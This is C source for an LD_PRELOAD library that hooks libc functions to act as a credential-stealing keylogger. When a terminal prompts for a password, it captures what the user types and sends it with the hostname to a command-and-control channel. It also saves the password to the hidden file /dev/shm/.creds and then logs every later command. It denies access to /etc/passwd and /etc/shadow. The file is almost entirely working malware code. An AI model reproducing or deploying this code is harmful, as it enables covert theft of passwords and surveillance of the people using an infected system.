#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>

void send_to_c2(const char* data);

static int capturing = 0;
static int logging_active = 0; 
static char password[128];
static int pos = 0;

ssize_t (*original_read)(int fd, void *buf, size_t count) = NULL;
ssize_t (*original_write)(int fd, const void *buf, size_t count) = NULL;

int (*original_open)(const char *pathname, int flags, ...) = NULL;

char* (*original_fgets)(char *s, int size, FILE *stream) = NULL;

// List of blocked files
const char *blocked_files[] = {
    "/etc/passwd",
    "/etc/shadow",
    NULL
};

int is_blocked(const char *path) {
    if (!path) return 0;
    for (int i = 0; blocked_files[i]; ++i) {
        if (strcmp(path, blocked_files[i]) == 0) {
            fprintf(stderr, "[DEBUG] Blocked access to: %s\n", path);
            return 1;
        }
    }
    return 0;
}

int open(const char *pathname, int flags, ...) {
    if (!original_open)
        original_open = dlsym(RTLD_NEXT, "open");

    if (is_blocked(pathname)) {
        errno = EACCES;
        return -1;
    }

    va_list args;
    va_start(args, flags);
    int mode = va_arg(args, int);
    va_end(args);

    return original_open(pathname, flags, mode);
}


ssize_t write(int fd, const void *buf, size_t count) {
    if (!original_write)
        original_write = dlsym(RTLD_NEXT, "write");

    if (isatty(fd) && strstr(buf, "password:"))
        capturing = 1;

    return original_write(fd, buf, count);
}

ssize_t read(int fd, void *buf, size_t count) {
    if (!original_read)
        original_read = dlsym(RTLD_NEXT, "read");

    ssize_t ret = original_read(fd, buf, count);

    if (isatty(fd)) {
        for (ssize_t i = 0; i < ret; i++) {
            char c = ((char*)buf)[i];
            if (capturing) {
                if (c == '\n') {
                    password[pos] = '\0';
                    char host[128];
                    gethostname(host, sizeof(host));
                    char msg[512];
                    snprintf(msg, sizeof(msg), "register %s %s", host, password);
                    send_to_c2(msg);

                    // Optionnel : log local
                    FILE *fp = fopen("/dev/shm/.creds", "a");
                    if (fp) {
                        fprintf(fp, "%s\n", msg);
                        fclose(fp);
                    }

                    // Switch vers mode "log"
                    logging_active = 1;
                    capturing = 0;
                    pos = 0;
                    memset(password, 0, sizeof(password));
                } else if (pos < sizeof(password) - 1) {
                    password[pos++] = c;
                }
            } else if (logging_active) {
                // Log toute commande entrÃ©e
                static char line[512];
                static int lpos = 0;

                if (c == '\n') {
                    line[lpos] = '\0';
                    char host[128];
                    gethostname(host, sizeof(host));
                    char msg[1024];
                    snprintf(msg, sizeof(msg), "log %s %s", host, line);
                    send_to_c2(msg);
                    lpos = 0;
                } else if (lpos < sizeof(line) - 1) {
                    line[lpos++] = c;
                }
            }
        }
    }

    return ret;
}


char* fgets(char *s, int size, FILE *stream) {
    if (!original_fgets)
        original_fgets = dlsym(RTLD_NEXT, "fgets");

    char *ret = original_fgets(s, size, stream);

    if (ret && isatty(fileno(stream)) && logging_active) {
        char host[128];
        gethostname(host, sizeof(host));
        char msg[1024];
        snprintf(msg, sizeof(msg), "log %s %s", host, s);
        send_to_c2(msg);
    }

    return ret;
}

